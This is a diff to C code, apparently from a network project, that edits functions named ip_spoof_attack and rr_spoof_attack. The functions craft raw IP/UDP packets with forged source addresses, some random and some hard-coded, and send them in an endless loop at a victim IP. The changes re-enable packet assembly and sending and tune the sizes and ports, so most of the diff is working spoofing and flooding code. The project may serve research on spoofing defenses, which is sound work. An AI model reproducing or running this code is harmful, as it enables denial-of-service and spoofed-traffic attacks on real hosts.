@@ -135,8 +135,8 @@ void ip_spoof_attack(char* victim_ip){
     ip.check = in_cksum((unsigned short *)&ip, sizeof(ip));
     memcpy(packet, &ip, sizeof(ip));
 
-    udp.uh_sport = htons(45512);
-    udp.uh_dport = htons(53512);
+    udp.uh_sport = htons(1);
+    udp.uh_dport = htons(1);
     udp.uh_ulen = htons(8);
     udp.uh_sum = 0;
     udp.uh_sum = in_cksum_udp(ip.saddr, ip.daddr, (unsigned short *)&udp, sizeof(udp));
@@ -175,13 +175,13 @@ void rr_spoof_attack(char* victim_ip){
   uint32_t random_num;
   int rr_spoof_hash = 0;
 
-  packet = (u_char *)malloc(60);
+  packet = (u_char *)malloc(116);
   
   while (1) {
     ip.ihl = 0x5;
     ip.version = 0x4;
     ip.tos = 0x0;
-    ip.tot_len = 60;
+    ip.tot_len = 60; // may have issue here
     ip.id = 0;
     ip.frag_off = 0x0;
     ip.ttl = 64;
@@ -193,19 +193,19 @@ void rr_spoof_attack(char* victim_ip){
             (random_num >> 16 & 0xFF) << 16 | 
             (random_num >> 8 & 0xFF) << 8 | 
             (random_num & 0xFF);
-    ip.saddr = ul_dst;
+    ip.saddr = inet_addr("10.10.128.122");
     //printf("%u\n",ul_dst);
     
     ip.daddr = inet_addr(victim_ip);
 //    ip.check = in_cksum((unsigned short *)&ip, sizeof(ip));
-//    memcpy(packet, &ip, sizeof(ip));
+    memcpy(packet, &ip, sizeof(ip));
 
     udp.uh_sport = htons(45512);
     udp.uh_dport = htons(53512);
     udp.uh_ulen = htons(8);
     udp.uh_sum = 0;
 //    udp.uh_sum = in_cksum_udp(ip.saddr, ip.daddr, (unsigned short *)&udp, sizeof(udp));
-//    memcpy(packet + 20, &udp, sizeof(udp));
+    memcpy(packet + 20, &udp, sizeof(udp));
 
     //char *msg = "You are under attack!";
     //memcpy(((void *) udp) + sizeof(struct udphdr), msg, strlen(msg));
@@ -214,7 +214,7 @@ void rr_spoof_attack(char* victim_ip){
     sin.sin_family = AF_INET;
     sin.sin_addr.s_addr = ip.daddr;
     
-    int pkt_size = 60;
+    int pkt_size = ntohs(ip.tot_len);
     struct iphdr *newpacket = (struct iphdr *)add_shim(packet, &pkt_size);
     Shim *shim = (void *)newpacket + sizeof(struct iphdr);
     struct in_addr rr_spoof_addr;
